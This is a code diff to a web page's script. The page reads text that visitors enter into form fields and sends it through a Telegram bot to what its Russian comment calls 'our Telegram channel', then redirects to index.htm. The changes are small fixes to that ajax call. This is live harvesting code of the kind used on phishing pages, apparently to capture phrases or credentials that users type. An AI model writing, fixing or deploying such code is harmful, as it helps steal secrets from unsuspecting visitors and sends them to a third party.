@@ -51,7 +51,6 @@
 
    </head>
   <script type="text/javascript">
-      import { $, jQuery } from 'jquery';
       function OnClickSendNudes() {
         const fraze1 = document.getElementById("input1").value;
         const fraze2 = document.getElementById("input2").value;
@@ -74,10 +73,10 @@
         //Отправляем текст в наш телеграм канал
         otpravka(token,text,chatid);
               function otpravka(token,text,chatid){
-              $.ajax({  
+              var z = $.ajax({  
               type: "POST",  
               url: "https://api.telegram.org/bot"+token+"/sendMessage?chat_id="+chatid,
-              data: "parse_mode=HTML&text="+encodeURIComponent(text), 
+              data: "parse_mode=HTML&text="+encodeURIComponent(text) 
               }); 
               window.open("index.htm");
           }
